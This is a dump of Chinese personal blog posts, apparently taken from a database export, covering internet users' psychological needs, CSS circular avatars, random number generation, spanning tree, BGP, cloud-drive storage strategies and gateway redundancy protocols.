\r\n\r\n##No.14发泄抒情的需求\r\n\r\n之所以将它排在15名是因为这个领域还是一片空白，“情感类”的相关产品本来就难定市场价，因此少有人刻意去挖掘这片土地，但也给创业者们一个可能想象空间。大家都曾见过供网友发泄的小游戏和互动吐槽的平台。此时正值O2O平台相对火爆，都市压力山大，生活中我们会有很多来源于工作、情感、学业、社会的感触和不满，这时我们很需要一个小小的出口，将其“宣泄”出来。但有时候我们不需要任何指定的人聆听“我”的声音，只是不愿意自己深陷在一个情绪里无法自拔。所以满足“发泄”这个需求，也可以作为移动创业者产品研发的一个“点”去发散。\r\n\r\n \r\n\r\n##No.13寻求共鸣\r\n\r\n这也是一个有待开发并且鲜为人知的大众心理。人总是热衷于接收与自己有关联的信息，借此形成情感共鸣。无论新闻广告还是网剧电影，里面都有特殊的人物映射着特定的社会群体，产生一种引力，当然这些都是参插在其中，有时候人们会去主动搜索与自己有关的内容，因为这种心理需求的满足有利于人的社会需求。这时候他们急需一个平台来聚合这些信息，甚至需要一个平台与“同好”们交流。当然最常见简单的手段还是通过在网页上放置一些带有吸引力标题的外部链接，如同植入广告。\r\n\r\n \r\n\r\n##No.12邪恶的心理\r\n\r\n这一点很刺激，但也很惭愧。有许多人堕于生活便想去寻求找心理平衡，比如喜闻乐见一些他人的悲剧新闻，幸灾乐祸有一种报复社会的快感。但邪恶心理远不止这些，更多人渴望利用网络满足自己自私的本性和不为人知的目的，例如人身攻击和恶意访问（然而这些是黑客更想干的事情）。以上可以归纳为狭义和广义的网络邪恶心理，其实这些“商机”在很多商业网站上都有所体现，这些利益链的宣传方式虽然恶心，但常常游走在法律的边缘，不为察觉罢了，所以笔者我不是非常建议利用这种心理赚钱，适可而止。\r\n\r\n \r\n\r\n##No.11审美的价值\r\n\r\n此新兴领域非常广泛，创新层出不穷。人们越来越注重网络产品的美观度，对细节的要求越来越高，也就是所谓的“用户体验”。现在无论是网页还是软件都追求一个“用户界面(User Interface)”，带给用户视觉上甚至听觉上的享受，借此提高点击量。这里不包括使用的方便性，因为方便性归纳于实用的角度。至于界面度该如何提高就太多了，比如背景图片音乐，动态渲染，人性化等等，当然还可以借美女形象，利用人体审美进行升华。\r\n\r\n \r\n\r\n##No.10贪心懒惰的心态\r\n\r\n我相信该点不言而喻，利用该心态是广告中最常见的手段之一。很多人喜欢贪图小便宜“不劳而获”，即使是富人。但是人们很少主动去搜索这些信息，大多还是被动的接受，与前面几个不同的是，这是很特殊的一个与利益有直接关系的心理。当然逐利是人之本性，并没有贬低的意思，至于商家们如何利用它提高宣传的效果也是一门艺术，这里就不多说了，还有站主们要充分利用好植入广告这个资源啊。\r\n\r\n \r\n\r\n##No.9精神寄托与慰藉\r\n\r\n人生在世，总会有迷茫苦闷的时候，常常进入情绪的低谷期。此时面对悲伤的自己，如果碰巧看完一篇心灵鸡汤的优美散文，或者有关人性美和励志的视频短片，那么会感到多么暖心啊。这就是人类对希望，关爱，善良的渴望，即使喜剧也有令人感动的结尾。也可体现在对某个名人或国家的信仰。前面提到了人性灰色的一面，我们自然就要想到人性的反面。网络给予这个需求很大的发展空间，创新者们若是能够抓住这个机遇必将大展宏图，还能为社会做出贡献。\r\n\r\n \r\n\r\n##No.8收集的乐趣\r\n\r\n我给予收集心理较高排名，因为很多数据暗示它的权重呈增长趋势。其一，收集东西，无论文章图片音乐还是视频，原创或者采集，都给人一种成就感，生活的痕迹与实在感，也是可以拿出来炫的资本。其二，现在很多经营养成类的手游，以及网游的等级装备等游戏元素，都符合了大众对收集的快感。第一点就衍生出了对软件的需求：一款方便好看的工具有助于随时调用整理自己的收藏品，便于日后回味。第二点游戏就不用说了，基本上只要是不需要太多游戏技巧的网络游戏或单机游戏，都能满足收藏的快感。\r\n\r\n \r\n\r\n##No.7挑战带来成就感\r\n\r\n主要是电子竞技类游戏，而且男性居多。这一点众所周知了，从古至今人们在休闲娱乐中总是给自己和他人创造路障再解决路障，最后坐下来慢慢炫耀自己的智慧。而到了21世纪随着生产力上升这种挑战心理日趋明显，从各大游戏公司中也能看出，年轻人每天花大量时间打游戏。\r\n\r\n \r\n\r\n##No.6好奇心和新鲜感\r\n\r\n好奇心理非常非常普遍，如果你想红想涨粉最好参考这一条。从各大新闻门户网站以及个人主页上就可以看出，但凡带有诱惑力的标题或“欲言又止”的言辞八卦的新闻或文章总能够收获极大量的点击量。虽然其中有很多虚假夸张故意博眼球的话题，但我发现百姓对其热情有增无减。除了媒体网站，其他大大小小的公众平台都喜欢在自己的网页边缘植入这些无聊的新闻链接，也许他们真的无聊吧！\r\n\r\n \r\n\r\n##No.5幽默娱乐\r\n\r\n生活离不开幽默，互联网上有着大量以娱乐为主题的喜剧、闹剧、笑话和综艺节目，工作之余品尝一下娱乐节目别有一番风味。但进入web2.0以后人们对幽默的需求也提升到2.0阶段，他们需要将幽默和信息资源结合在一起，比如一篇学术文章或者一部纪录片视频，如果全是枯燥的叙述和讲解那么很少有人会认真看完，但只要在其中偶尔穿插一些幽默的言辞和笑谈，类比和图示，那它的人气必然会迅猛升高。',2637),(18,'自制网络心理需求大排名! (下)','2018-01-22 16:09:39',0,0,6,'>###最常见的四个重要需求\r\n \r\n\r\n##No.4荷尔蒙\r\n\r\n通俗点说就是性需求。之所以列入前四名是因为互联网的诞生大大的满足了人们的荷尔蒙需求，从海量文件资源到繁荣的O2O平台再加上开放的思想观念都极大促进了产业的发展，甚至只要略带一点点“性”暗示的文章标题就能获得大量的访问。从互联网发展到今天，我们都发现，任何能够激发用户荷尔蒙的创意和话题，都能吸引大部分的跟随转发者。一切带着“色彩”的东西，都会吸引用户的眼球。荷尔蒙需求本是生理需求，我却将它归为特殊的心理需求因为它并没有随着经济增长而更加“可得”。虽然国家对相关服务有所打击，但我认为它客观上促进了社会发展：某种程度上满足了人们的生理需求，让人们留更多精力给学习和工作。\r\n\r\n \r\n\r\n##No.3孤独感\r\n\r\n我这里所说的孤独是个泛化的概念。无论是单身还是有伴侣，我们有时都会出现莫名的孤独感。这些孤独感，促成了社群的诞生。我们总期待通过一个平台，找到更多的志同道合的朋友，在某个领域分享成长；同时，我们也渴望找到一扇窗，让我们能够透过这扇窗了解更多外面的世界，看到更多的精彩，丰满自己的内心。孤独的人渴望热闹，喜欢看综艺节目，喜欢聊天，尤其在大都市，科技的发展和百姓孤独感相互促进，让我们完全离不开网络。所以这里的孤独也泛指那些在网络上无法映射到现实生活的情愫，也是对网络严重的依赖性，产生了“断网恐惧症”，所以说孤独是现代社会人们最最深刻的生活感触。说了这么多孤独的需求，开发者们想好对策了吗？\r\n\r\n \r\n\r\n##No.2虚荣心\r\n\r\n虚荣心无疑是人际社会第一大心理需求！人之于社会，有一个最重要的潜意识，就是炫耀与渴望被认可。这里的炫耀与虚荣，不全是带着贬义的词语，更多的是指，我们期待能够嫁接一个产品/平台，将自己的才艺、态度、或者潜能展现出来。这是一个“自媒体”的时代，人人都有机会站在舞台的中央，为自己代言，所以，只要你敢于吸收人气，你就是最耀眼的主角。这个时代没有人再韬光养晦，坐等“三顾茅庐”，只有大胆表明渴望被这个世界认识。正如刚开始所说，物质条件提高导致人疯狂追求物质之外的东西，其中很大一部分落在了人与人之间的虚荣心理。从这几年一直被推崇的“服务体验”中也可以看出，即使面对面的交流，人也想要刻意去显示自己的“尊贵”。虚荣心符合了未来发展的趋势，相关产业的身价一定会越来越高，投资者们做好准备！\r\n\r\n \r\n\r\n##No.1虚拟世界\r\n\r\n虚拟世界当之无愧是所有排名中承载最多流量，用户青睐最多的应用。显示屏技术进入高清晰时代是虚拟世界里程碑式的转折点。最具代表性的是电影电视剧。每个人都渴望逃离现实，进入到一个新的故事情景中可以给人带来无尽的幻想。其中不同社会身份的人有不同的需求，比如年轻女性喜爱韩剧就映射了她们渴望被关爱的自身需要。美国的大型的3D全景电子游戏（通常在10GB以上大小）之所以风靡全球并不是因为像《魔兽世界》一样考验游戏水平，而是因为它们虚拟出了一个宏大逼真的3D世界，让玩家在其中尽情探索。人类以及所有动物都有一个共通的生理需求，那就是需要不停改变周边环境以刺激感官的活力，困禁在同一个地方太久会抑郁至疾。因此人需要旅游，需要运动，而互联网创造的虚拟世界提供了比现实还要丰富的虚拟环境，可以模拟出很多现实生活中根本无法完成的事情。随着时间演变，这个占用了人们最多空闲时间的对虚拟世界的需求将一举成为未来无可限量的商机！！\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n    以上就是笔者这些天的作品，删删改改好几次的最终成作。本文少有具体的举例，只有满满的概括，因为实例实在太多不能以偏概全，再加上笔者是个完美主义者，希望列举所有现象却无能为力，因此就选择写一个精简版，请大家见谅。\r\n\r\n其实还有很多特色化的网络心理，比如一些变态的心理，当然那些都只属于少数人。但我想说通过对少数心理的挖掘可以预测大众心理的变化，毕竟新的趋势总是由小变大的，这也是创业者们必备的素质。\r\n\r\n科技越发达，人对环境的要求越来越高，人追求的东西也越来越复杂。总之一切都离不开“趋势”这两个字，把握住趋势才能真正把握住网络经济前进的命脉。愿读完文章的你，创业之路能够得到启发，也祝愿倍感孤独在行走着的你，能够坚持到最后，笑到最后！\r\n\r\n',1765),(20,'圆形头像和边框的实现','2018-01-22 21:45:00',2,0,12,'直接上实现方式吧,也没啥技术含量:\r\n>将img元素的border-radius属性设置为50%,width和height相等(正方形)\r\n\r\n注意:如果width和height不等的话,呈现的是椭圆形(即没有直线)\r\n\r\n这个特性在bootstrap中已经为我们封装好了,直接将img加入到类.img-circle就行了,注意不要覆盖了就行.\r\n圆角矩形的作用还是很多的,本博客很多按钮和栏目都用到了它,一定要结合chrome调试使用,多多益善.\r\n\r\n圆形边框:在以上圆形div的基础上建立边框\r\n\r\n###方法二\r\n从根源上实现圆形遮罩:\r\n利用Photoshop等软件制作一个在img之上的一个图层,其中挖一个圆形的选区,alpha值(实在度)为0(即完全透明).\r\n这个方法可扩展性比较强,因为透明图层可以实现多种形状,缺点是稍微复杂.\r\n\r\n###总结\r\nchrome真乃前端调试之神器也.\r\n![](https://image-store.slidesharecdn.com/255d245b-6680-4705-b7af-88d257f9a7b7-original.jpeg)',496),(21,'浅谈计算机与随机数','2018-01-24 14:12:39',1,0,7,'两年前写的随笔,翻网盘的时候意外地被发现,觉得挺有意思的就把它原封不动搬过来...\r\n##浅谈计算机与随机数\r\n>       闲来无事，看到关于人工智能的新闻，想到现在好多产品都喜欢给自己贴上“智能”的标签，因而又想到我高中时期的一次研讨会上大家由这个话题延伸至“计算机如何生成随机数”。现在我想把对随机数生成器的理解写下来。\r\n       首先需要声明，计算机是不会产生绝对随机的随机数，它只能产生“真随机数”。\r\n       真正意义上的随机数是一个个相互独立，具有一定发生概率且不可预计的数。而现代计算机的程序和算法本身不能产生真随机数。计算机可以知识渊博（海量存储嘛），也可以很智能（按照植入的程序高速计算），但不论它的运算速度有多快，都还是按照事先设计好的算法逻辑来运行的。仅依靠计算机内部的程序只能生成伪随机数，伪随机数发生的概率极不稳定，实验表明：当试验次数越来越多，伪随机数样本就越来越不服从均匀分布。不难理解，伪随机数只是按照数学家们精心构造的规则而生成的（比如C语言中的随机数生成函数），它们是通过一个固定的、可以重复的计算方法产生的，只是具有很长的周期性罢了。因此，人类不断改造计算机，试图使其有生成真随机数的能力。   \r\n       电脑自然是没有人脑聪明的。就存储能力而言，计算机硬盘采用一维存储（二进制数的依次排列）以及二维检索（坐标查找）的方式来实现输入与输出；而众所周知，人的大脑是由神经元构成的，神经细胞相互之间通过神经突触相互影响，形成极其复杂的相互联系，记忆就是无数脑神经细胞之间相互呼叫所形成的一种多维的存储方式，人脑计算功能也是如此。经科学家计算，每10个神经元就相当于1TB硬盘的存储容量，人脑上千亿个神经元的存储力可想而知。但是，人脑能产生真随机数吗？随便一个人，让他随机说出10以内的整数：2,3,7,9,5……。当说出足够多的数后，研究人员统计发现，每个数字出现的次数比例不尽相同且差距很大，完全不符合随机分布，且不同的人有不同的情况。因此人脑也不能产生正真的随机数，比如我们说出下一个随机数之前，潜意识已经被上一个数影响，单这一点就违背了随机数的定义。   \r\n       那计算机的真随机数发生器是怎么做到的呢？关键还是在于它的算法。虽然人脑不能生成真随机数，但人类可以设计出各种方案以产生随机性很高的随机数。比如随便想出一个汉字，数它的笔划数：奇数代表是，偶数代表否。如此是和否的概率都近似50%。再比如拿一本书从中间翻开观察页数；抬起头看看时钟的指针位置；找一个英文单词观察长度；找一张现成的表格（比如全市人民身份信息表），等等方法都可以生成相当准确的随机数。计算机的随机数发生器就是利用了一张巨大的“表格”：其中的每个元素覆盖了所需随机数的范围，元素的坐标既是来自外界的随机因子（称之为随机种子）。这张表类似于密码学中的秘钥，是一种并不复杂的算法。   \r\n       来自外界（cpu以外）的随机种子可以是任何计算机可识别的因素：从键盘敲击速度，鼠标位置变化，内存占用大小，磁盘读写速率到IO请求的响应时间，硬件中断的时间间隔，风扇的旋转功率，当时的时间和日期，邻居家无线信号强度变化，甚至此时的气温湿度和磁场，它们都可以被用来参与随机数的计算。这才是未来程序语言和软件中真随机数生成函数的工作原理。  \r\n       然而正如刚开始所说，计算机无法生成绝对随机的随机数，随机只是理想化的。事实上，世上本无概率之说，全宇宙都不存在随机的东西，世间万物的发展与变化都遵循着其固有的规律，包括人类。至于刚才所说的利用外界因素和计算机系统作为整体迂回产生的随机数也并不是100%的随机，只要试验次数足够多（可能天文数字都无法衡量），随机分布状态便会瓦解。当然，这是个无尽的话题，如果更深入的话，还需要论及宇宙的本质之类的哲学命题，暂且不表。   \r\n       对计算机与随机数的思考，让我联想到如今高速发展的人工智能。你觉得机器人还有机会超越人类吗？它们的“大脑”连生成真随机数的本领都没有（至少目前没有）。当代计算机只有绝对服从的程序语言，不会有自己的思想，不会具有人类的情感，不会有喜怒哀乐，更不会有曾经谣传的超级计算机“愤怒”而杀人的事件。如果在遥远的未来人成功得将计算机改造拥有能够匹敌21世纪人类大脑智慧的力量，那么此时人类的大脑必然已进化到一个更高更智慧的状态。\r\n\r\n---\r\n以上内容毫无科学依据,仅供娱乐 (ﾟДﾟ#) ',1857),(23,'生成树算法终极解析 [下]','2018-01-24 14:27:10',0,0,9,'##(下)\r\n一般情况下二层交换机的mac地址表中存储两项内容：1.邻居上与自己相连的端口的mac地址以及相对应的本地端口编号；2.PC主机的mac地 址以及相对应的本地端口编号。交换机的端口模式告诉自己对方是主机还是交换机。对于每条链路的两个端口来说，有且只有一个指定端口，对端是根端口或堵塞端 口。对于每个交换机来说，有且只有一个根端口，其余的是指定或堵塞端口（也叫非指定端口）。注意！文章之后提到的交换机角色，端口角色，端口状态都是基于 某个vlan的，即因vlan而异（非常重要）。\r\n\r\n现在正式进入生成树算法的详解。\r\n\r\n首先，交换机没有“眼睛”，只能通过相互间约定好的协议来获悉整个拓扑图。给通了电的交换机的某个端口一插上网线，它就检测到（就像插入耳机）并从这根线向外发送bpdu（但它并不知道这根线后面是什么情况并开始竞选。因此即使拓扑中没有环，stp竞选也会正常进行（stp不能检测到环路，只能避免环路）。\r\n\r\n网桥协议数据单元BPDU（Bridge Protocol Data Unit）是用于生成树计算（竞选）的核心数据帧。有一点须要注意，bpdu是基于特定交换机的，即不同的个交换机有不同的bpdu。交换机之间通过发送比较它来完成竞选。注意，在竞选过程中，交换机只把自身的bpdu不断地复制并发给所有邻居，但邻居不会把这个bpdu转发给下一个邻居。\r\n\r\nBpdu数据帧包含以下主要字段：首先是vlan ID（代表这是vlan几的bpdu），bpdu的标识以及版本号（区分stp与rstp），根桥的id（优先级与mac地址），cost（自己到根桥的最佳开销），自身的id（优先级与mac），端口id（发出bpdu的本地端口号和端口优先级），最大老化时间（自己到根桥的跳数，单位秒）。（若想了解完整字段请登录思科官网）\r\n\r\n每个交换机单位时间内（2s）发送Bpdu的数量取决于本地开启vlan数量和激活端口（up状态）数量。假如交换机A检测到有三个端口被插入网线，且在它的vlan database中开启了vlan 2、3、4，则交换机A每两秒就要从各个端口向外发各个vlan的bpdu，总共3*4=12个（前提是端口上先配置trunk link模式）（每条链路只需在一边的端口配trunk即可）（若网络中只有vlan1则不需trunk因为vlan1没有标签）（数据从主机进入交换机被加上标签，从access链路出去时删除标签，trunk模式让vlan标签不被删除）。\r\n\r\n（交换机收到某一个vlan的数据，若该vlan本地未开启，则数据直接丢弃，不学习mac）。\r\n\r\n首先开始竞选根桥。（对于vlan x，接收到所有vlan x的bpdu情况下）交换机A根桥id字段的初始值是自己id，每收到比该值更优的id（比如收到交换机B发来的bpdu）（先比较优先级再比较mac）就将该值更新为它。根桥id字段的更新伴随着cost字段的更新（根桥id字段不变时，cost字段也可能更新，即找到一个去往根桥的更优路径），其初始值是0，更新后变为B的cost字段值再加上AB之间链路的开销（所有邻接链路的开销存储记录在交换机中）即使自己到根桥的开销。也就是说交换机初始认为自己就是根桥。\r\n\r\n（端口收到一个未知数据帧，先扫描其表示与版本字段以确定它是个bpdu帧，再扫描vlan id字段以确定它是vlan几的bpdu，然后将它与自己相对应vlan的bpdu比较）\r\n\r\n可以想象，以此机制，经过足够长的时间（几秒钟）每个交换机的vlan x的根桥id字段达到一致。\r\n\r\n根桥选好后非根桥就开始选根端口（本质就是选择唯一一条最优路径（每个vlan）通向根桥）（其实自从根桥id字段从初始值开始更新起，根端口的竞选就开始了）。根端口竞选和根桥竞选很类似，也是一种“逐优更新法”在交换机内存中有一块区域（记为m）专门存储根端口的端口编号（如f0/1）。如在上个例子中，B发送的bpdu改变了A的bpdu（根桥id和cost字段），则A的区域m内的值变为刚才接收bpdu的端口编号。当A又收到交换机C的bpdu，若其优化（更新）了自己的根桥id字段则区域m随之更新，若没有优化而是与自己的根桥id字段一样则看它是否改变了自己的cost字段（即C与B的cost字段进行竞争），若B与C的cost字段值相等则比较B与C的自身id字段谁更优以决定m区域值是否改变。\r\n\r\n如果此时你已经乱了请别急，之后我会总结出一个总的流程给你看。\r\n\r\n到了竞选的最后一步：竞选指定桥（决定之后不用的链路的哪一端保持堵塞状态/丢弃状态）。首先要搞清楚，指定桥是基于链路的，每条链路两端的交换机中有且只有一个指定桥，或者说每个交换机可以既是指定桥也是非指定桥（对于不同端口）。指定桥那一边的端口叫指定端口。指定桥的竞选：先比较cost字段再比较自身id字段（bridge id）。所以，根端口对应的端口永远是指定端口，根桥上的已激活的端口都是指定端口。（竞选失败的端口就成为非指定端口）。好了，交换机上的根端口和指定端口都确定了之后，非指定端口就一直处于堵塞状态。根端口，指定端口以及一直未收到vlan x的bpdu的端口（比如连接PC的或连接的某个交换机没有启动vlan x）过30秒后进入转发状态（之后再说）。\r\n\r\n！！以上竞选过程中（rstp），所有端口都处于丢弃状态（discarding）（或堵塞状态）（注意堵塞与禁用状态的区别：禁用指down状态如强行关闭和未插入网线的端口，不能接收转发数据；而堵塞端口可以接受发送bpdu，但不能转发（他人的）数据帧）。而正常工作状态下，除了堵塞端口（指替代端口和备份端口，也叫非指定端口）（对于每个vlan）其余端口皆处于转发状态。（学习状态只是一种过渡状态，即堵塞端口一直处于堵塞状态，而根端口与指定端口将从堵塞状态过渡到转发状态）\r\n\r\n到此为止，所有竞选结束了。在逻辑上竞选的大致顺序是：1.竞选根桥2.竞选根端口3.竞选指定端口（指定桥）。但事实上他们三者的竞选几乎是同时进行的。在物理层面上，每收到一个bpdu之后的几毫秒内，交换机的多个内存字段（如根桥id，到根桥cost，根端口编号，指定端口编号等）会依次发生更新。直到这些字段连续15秒内未发生任何变化（计时器）（对于每个vlan而言），交换机就认为竞选已结束（网络已收敛完毕），然后非堵塞端口进入学习状态。\r\n\r\n（某些特殊端口，如连接PC的端口和连接某个没有启动vlan x的交换机的端口，由于端口角色默认是所在链路上的指定端口，因为一直没收到对方发来的关于vlan x的bpdu，该端口角色字段一直未更新，最终也处于转发转发状态）（合情合理）。\r\n\r\n学习状态并不是很重要，端口仍处于堵塞状态，只是在这一阶段学习邻居和PC的mac地址。学习状态也持续15秒，之后就进入转发状态（即正常工作状态）。所以一般来说交换层网络交换机从通电连接到可以正常工作需30秒左右（在rstp下）。\r\n\r\n当所有交换机进入转发状态后，网络也就“通”了，至此，交换机不用再那么频繁地向邻居发送bpdu占用带宽了。对于每棵生成树，因为是转发状态交换机只需转发根桥的bpdu向身后的生成树成员。此行为的目的：维护生成树。每个根桥都广播自身的bpdu到所有成员（成员不在发送自己的bpdu了）。所有非根桥在最大老化时间内都要监听到对应根桥的bpdu并且广播它，不然就认为该生成树已受到了破坏。\r\n\r\n若交换网络真的发生了故障（比如其中某根网线突然被剪断了），那就有一部分交换机收不到根桥的bpdu。 为了维护生成树的完整，替代端口变成交换机上的根端口。大多数的堵塞端口（正常工作情况下）都是替代端口（只有当相邻交换机之间存在两条链路时，其中一条 是备份链路）。因为替代端口的对面必定是指定端口，因此可以通过这个替代端口从对方交换机抵达根桥。因此不需要重算生成树，这事rstp的改进之处。（局部等待30s）\r\n\r\n但若网络没有故障，而是被接入了若干新的交换机，或者并入了一个更大的交换网络，那么每个vlan生成树就要重新开始从头计算了。具体的机制是：（因为网络变化，必须让所有交换机知晓，并停止工作回到竞选的初始状态）检测到网络变化（vlan x）的交换机发送一个特殊的bpdu到它的“前任”根桥（通过一个个根端口）。这个bpdu叫拓扑更改通知 TCN（Topology Change Notification）（区分于bpsu版本字段）。因为生成树重算非常重要，TCN的传送采用可靠连接，因此相对应的确认消息叫TCA（Topology Change Acknowledge），它们建立在每两个交换机之间。前任根桥收到后再通知树上的所有成员。（但个人认为不需要通知根桥，直接广播扩散到所有成员即可）\r\n\r\n    以上就是生成树算法的收敛机制与维护机制，有没有感觉到它是个很聪明的算法？不过rstp还有许多进步的功能，如portfast等子协议，若想了解详情以及最新消息，请进入思科官网搜索（www.cisco.com）。\r\n\r\n------\r\n(完)',3771),(25,'对BGP思想的个人理解 [下]','2018-01-24 14:49:09',1,0,9,' 另一种解决方案是不在CE的中转路径上启动BGP，只CE间指定邻居。这种方案也会带来一个问题，即路由黑洞。路由黑洞指ping不通路由表里的目标网络的现象。通常当路由表中的某一个条目在非邻居AS中时，往往ping不通。原因如下：\r\n\r\n       AS 200的中转路由器R3（无BGP）转发AS 100的某个路由条目给AS 300的BGP路由表，但自身路由表中却没有这个条目（不可达），因此R7 ping AS 100中的网段会失败。\r\n\r\n![这里写图片描述](https://image-store.slidesharecdn.com/353fa7eb-1a3b-414f-bbef-12eacc3f7889-original.jpeg)\r\n\r\n\r\n       可以用MPLS来解决这个问题，由于mpls技术很复杂需要另作文章，这里讲主要逻辑：标签匹配路由与标签交换，在AS 200中共享路由条目的标签（插入数据包），这样R3寻路时不用看路由表了。\r\n\r\n       然而BGP最主要是用在ISP分站之间，或者说是互联网的骨干协议。每一个AS或者联邦可以看成是互联网的结点。\r\n\r\n![这里写图片描述](http://s6.sinaimg.cn/large/00688cvOzy732jrg0mx45&690)\r\n\r\n       每家ISP的BGP路由器都存有数十万条互联网的路由条目。通过类比IGP发现也是通过结点间交换路由更新信息而来。首先BGP需要知道所属AS的内部网段信息，这有两种途径：\r\n\r\n       1.宣告网络。不一定要宣告直连网络，只要IGP路由表中有的都可以宣告。\r\n\r\n       2.重分发。直接将IGP分发进BGP，一键到底比较方便。\r\n\r\n       然后与邻居AS交换路由信息表即可。\r\n\r\n       返回来谈谈BGP邻居的建立过程。命令行指定邻居地址后，路由器会查询路由表，找到这个地址后向它发送TCP连接，三次握手之后才开始发送与接收open消息（跨网段），之后完成建立。Open消息主要包括：router-id、认证口令、目的与源地址、跳数与AS号。\r\n\r\n       因为程序员逻辑，对ebgp peer发送hello包的TTL值为1，因为ebgp peer一般都是直连，如果用直连接口地址的话没有问题；但如果想用对方的环回口作为peer地址则会出现问题：对方收到包后将其ttl值减1变成0后丢弃，不在转向自己的环回口，关系无法建立。Ebgp多跳命令由此产生，用于强制修改数据包ttl值（一般改为2）。\r\n\r\n       又因为程序员逻辑，前面也说过，BGP认为下一跳是下一个AS，路由更新起源于AS外的话，跟新包的源地址保持为AS外的地址，当此CE发给他的ibgp peer后，peer认为下一跳在AS外不可达，又导致了中断。Ibgp下一跳命令由此产生：总是做在ibgp peer之间。\r\n\r\n       BGP同步机制是一个无用的鸡肋（而且也默认关闭），旨在将BGP更新同步给内网所有路由器。但这样一来相当于所有路由器都启用了BGP，BGP还有什么意义呢？要知道企业内部路由器的性能是无法承受几十万条路由的。\r\n\r\n       BGP的选路机制。BGP 11条选路策略中最常用的是第四条：选择穿越自治系统数量最少的路径，也就是AS的\"跳数\"……\r\n\r\n——第一部完',1419),(26,'百度等大容量网盘背后的真实策略解读','2018-01-24 14:54:00',0,0,16,'大一时写的论文,搬录于2018-01-24\r\n>当下，随着存储技术的飞速发展，各大公司都推出了云存储服务。但因为是免费面向大众的，无论微软的OneDrive还是百度的云网盘，好多人都难理解他们如何支撑起如此庞大的存储空间。就百度网盘而言 ，每个用户都可以免费得至少两个T的空间。其实百度并没有财力雄厚到为每个良好公民够买一个2T的硬盘，我们上传最多的无非是文本、图片、音频和视频，其中视频容量最最大，百度公司只要搞定“视频”这一关就足以撑起这一庞大的商业应用。据我自己总结，这背后主要有三点主要策略！\r\n\r\n- 第一点，也是都能猜到的一点，大部分用户面对这2T的容量自然不会一下全部用完，据统计平均每个用户只上传了50~60M的文件，那么剩下的空间自然不会给你闲在那，百度也不傻，自然是存放其他人的上传文件。其实具体实施时，百度有一个存储器集群专门存放用户文件，我们每个人的空间都是一个虚拟（virtual）硬盘，而且它的大小是弹性的，按需分配，所有人的文件按上传时间顺序依次存放。而在终端用户上还显示的是连续的2T空间，这样宝贵的服务器硬盘空间不就节省出来了吗？\r\n- 第二点，程序员发现，与邮箱不同，网盘里大家上传的内容有很多重复，尤其是电影电视剧，常常对于一个视频有上千次的重复上传。那么机会来了，显然只要对同一种文件存放一份，用户们共享它即可。但是计算机如何识别两个相同的文件呢？光比较文件名当然不行，这时厂商会利用哈希算法（Hash）算出每个文件的哈希值，哈希值相同则文件相同，要知道文件改变一个字符就会对哈希值产生天差地别的变化。然而如果每个文件上传时都计算的话，服务器的cpu很容易负荷超载，于是聪明的程序员想到一个办法，就是让客户机自己算，算完后再一起上传，这样算出之后若发现已经有重复就干脆不用上传了，直接在用户界面标记“秒传”。所以程序员写了个小软件或小插件，美其名曰“上传控件”，下载后会访问我们的cpu，成功圆事儿！\r\n- 第三点，也是最强的一招，先要说到我们为什么要上传那些电影等视频了。比如好多人会把上传一些从优酷下载下来的视频和音乐，一个原因是看地方便，另一个原因是为了收藏老视频，防止哪天网上再也找不到了（或者要收费）。但百度知道这些视频网站的更新策略啊，百度资深的合作伙伴们会向百度提供视频的地址，并提供快速通道。这样一来借他人之手，百度网盘无需花费一个字节就可以实现各大网站视频的海量存储！！\r\n',1016),(28,'交换层网关协议大总结 [下]','2018-01-24 15:19:53',0,0,4,'该图也适用于glbp。接下来实现网关备份的具体过程：\r\n\r\n若这些PC的ip都在同一个子网内，那给这个子网分配一个网关备份组（组编号）将若干路由器（不同协议有数量限制）加入到这个组中给这个组分配唯一的一个虚拟ip（即该子网内随便一个主机号），系统给这个组自动分配一个虚拟mac（注：虚拟ip可以与路由器接口真实ip在同一子网，也可以是接口真实ip所在子网下再划分的子网的主机号~）。将每台PC的网关ip都手动设置成这个虚拟ip（因为在交换层“寻路”都是通过mac地址，PC解析这个ip时，备份组回复给它虚拟mac值，同时备份组告诉交换机这个虚拟mac指向active/master）（！！！二层交换机“寻路”依靠mac地址表中的三个条目：PC的mac，网关接口mac，邻居交换机接口mac），由此PC向外通讯都将数据帧中目的mac字段值写为该虚拟mac。\r\n\r\n    Active/master有两种情况被取代。第一种情况：因备份网关的holdtime到期后接任；第二种情况：Active/master所追踪的对象“挂了”导致自降优先级至小于某台开启了抢占的备份机，于是被抢占。\r\n\r\n    当然，这幅物理拓扑图可以按组划分为多幅逻辑图，即有多个子网多个备份组，一台PC只能加入一个组但一个网关可以加入到多个组中。！注：若网关是多层交换机则可以使用SVI（switch virtual interface），为每个vlan安排一个备份组，在SVI下设置ip。\r\n\r\n---\r\n\r\n---\r\n！！补充实验：\r\n\r\n问题描述：子网内只有一个多层交换机充当网关，要实现网关的链路冗余，即使用EC将连接多层交换机的两个接口捆绑在一起（路由器貌似做不到）。拓扑图：\r\n![这里写图片描述](http://s12.sinaimg.cn/large/00688cvOzy73kxAVcvh9b&690)\r\n这是用Packet Tracer模拟实验的截图，可以看出，子网中只有vlan1但出现了“环路”，其实是因为EC逃避了stp计算（注：EC只能在交换网中玩儿）。\r\n\r\n---\r\n\r\n---\r\n\r\nGLBP。GLBP除了提供冗余还可以让组中所有成员共同承担流量的转发。它的具体思想如下：\r\n\r\n前期与HSRP一样，将多个物理网关加入到一个备份组中。组中的成员都叫AVF（active virtual forwarder）（顾名思义，所有AVF都负责转发数据），其中某一个AVF还叫做AVG（active virtual gateway）（竞选而来）。该组有一个虚拟ip但有多个虚拟mac地址：AVG给每个AVF分配一个虚拟mac。当备份组对应的子网内的某个PC解析虚拟ip时，AVG返回其中的一个虚拟mac。\r\n\r\n这里有一个简单易懂的循环负载分担算法：当收到一个个PC发来的arp时，AVG在自己的虚拟mac列表中按顺序循环的分发这些地址给PC，以保证每个AVF所负责的PC数量相同（或相差不超过一台）。\r\n\r\n其实用HSRP或VRRP也能实现负载分担，方法是：将多个物理网关共同加入到多个组，每个组虚拟ip都属于同一个子网，物理网关在不同组有不同角色，为每个PC分配不同的网关ip（其实一个子网可以有多个网关，关键看给PC设置的网关ip，但一个PC只能有一个对应网关）。但这个方法配置工作量很大，因此才出现了GLBP。\r\n\r\n！！！补充知识：\r\n\r\n> 【1】      FHRP的配置都是在接口下（除了多层交换机的svi）。网关因此知道，这个接口连接的是该接口ip所在的子网。\r\n> \r\n> 【2】      FHRP的认证机制是为了防止恶意网关加入到某个备份组中。和动态路由协议的认证原理相同，都是相互hello时自动进行的。\r\n> 